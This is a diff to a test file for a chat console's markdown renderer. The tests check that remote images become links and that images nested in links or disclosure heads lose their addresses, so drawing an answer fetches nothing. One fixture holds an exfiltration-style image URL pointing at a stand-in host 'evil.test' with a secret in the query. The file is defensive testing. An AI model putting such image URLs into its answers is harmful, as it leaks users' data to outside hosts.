@@ -35,6 +35,8 @@ const elements = (html: string) =>
     .replace(/<link rel="preload" as="image" href="\/icon\.svg"[^>]*>/g, '')
     .split(/<[a-z]+\b[^>]*data-testid="(?:message-actions-row|floating-copy)"/)[0]
     .matchAll(/<([a-zA-Z][\w-]*)/g)].map((m) => m[1].toLowerCase())
+// the images the answer drew, past the avatar
+const imagesOf = (html: string) => [...html.matchAll(/<img\b[^>]*>/g)].map((m) => m[0]).filter((tag) => !tag.includes('src="/icon.svg"'))
 const anchor = (html: string, href: string) => new RegExp(`<a\\b[^>]*href="${href.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}"[^>]*>`).exec(html)?.[0] ?? 'no such link'
 
 describe.each(SURFACES)('%s: what an answer cannot draw', (_name, render) => {
@@ -104,7 +106,7 @@ describe.each(SURFACES)('%s: what an answer cannot draw', (_name, render) => {
   })
 
   it('a link in the head of a disclosure is its words, and one in the body stays a link', () => {
-    for (const head of ['<a href="https://example.test/head">docs</a>', 'see <b><a href="https://example.test/head">docs</a></b>']) {
+    for (const head of ['<a href="https://example.test/head">docs</a>', 'see <b><a href="https://example.test/head">docs</a></b>', '<img src="https://example.test/head" alt="docs">']) {
       const html = render(`<details>\n<summary>${head}</summary>\n\n[body](https://example.test/body)\n\n</details>`)
       expect(html).not.toContain('https://example.test/head')
       expect(html).toContain('docs')
@@ -368,8 +370,32 @@ describe.each(SURFACES)('%s: what an answer keeps', (_name, render) => {
     }
   })
 
-  it('an image keeps its address and its text', () => {
-    expect(render('![A chart](https://example.test/a.png "Title")')).toContain('<img src="https://example.test/a.png" alt="A chart" title="Title"/>')
+  it('an image of another host is a link to its address, so drawing the answer fetches nothing', () => {
+    const html = render('![A chart](https://example.test/a.png "Title") and <img src="https://example.test/b.png" alt="">')
+    expect(imagesOf(html)).toEqual([])
+    expect(html).not.toContain('as="image" href="https://example.test')
+    expect(anchor(html, 'https://example.test/a.png')).toContain('title="Title"')
+    expect(anchor(html, 'https://example.test/a.png')).toContain('target="_blank"')
+    expect(html).toContain('>A chart</a>')
+    expect(html).toContain('>https://example.test/b.png</a>')
+  })
+
+  it('an image inside a link is its words, so the words open the link and not the image\'s address', () => {
+    for (const md of ['[![Runbook](https://example.test/img.png)](https://example.test/runbook)', '<a href="https://example.test/runbook"><img src="https://example.test/img.png" alt="Runbook"></a>']) {
+      const html = render(md)
+      expect(html).not.toContain('example.test/img.png')
+      expect(html).toMatch(/<a\b[^>]*href="https:\/\/example\.test\/runbook"[^>]*>Runbook<\/a>/)
+      expect(elements(html).filter((tag) => tag === 'a')).toEqual(['a'])
+    }
+  })
+
+  it('an image with no alt inside a link or a disclosure\'s head is a word, never its address as the link\'s text', () => {
+    for (const md of ['[![](https://evil.test/i.png?d=secret)](https://ok.test/runbook)', '<details>\n<summary><img src="https://evil.test/i.png?d=secret"></summary>\n\nbody\n\n</details>']) {
+      const html = render(md)
+      expect(html).not.toContain('evil.test')
+      expect(html).toContain('image')
+    }
+    expect(render('[![](https://evil.test/i.png?d=secret)](https://ok.test/runbook)')).toMatch(/<a\b[^>]*href="https:\/\/ok\.test\/runbook"[^>]*>image<\/a>/)
   })
 
   it('an image on the console\'s own host keeps its text and loses its address, so drawing the answer asks the console nothing', () => {
@@ -380,11 +406,11 @@ describe.each(SURFACES)('%s: what an answer keeps', (_name, render) => {
         'https://console.example.test/api/v1/x', 'http://CONSOLE.example.test:8443/api/v1/x', '/\\console.example.test/api/v1/x',
       ]) {
         const html = render(`![shown](${src}) and <img src="${src}" alt="raw">`)
-        const images = [...html.matchAll(/<img\b[^>]*>/g)].map((m) => m[0]).filter((tag) => /alt="(?:shown|raw)"/.test(tag))
-        expect(images).toEqual(['<img alt="shown"/>', '<img alt="raw"/>'])
+        expect(imagesOf(html)).toEqual([])
+        expect(html).toContain('<span>shown</span> and <span>raw</span>')
         expect([...html.matchAll(/<link rel="preload" as="image" href="([^"]*)"/g)].map((m) => m[1]).filter((href) => href !== '/icon.svg')).toEqual([])
       }
-      expect(render('![A chart](https://example.test/a.png)')).toContain('<img src="https://example.test/a.png" alt="A chart"/>')
+      expect(anchor(render('![A chart](https://example.test/a.png)'), 'https://example.test/a.png')).toContain('target="_blank"')
     } finally {
       vi.unstubAllGlobals()
     }
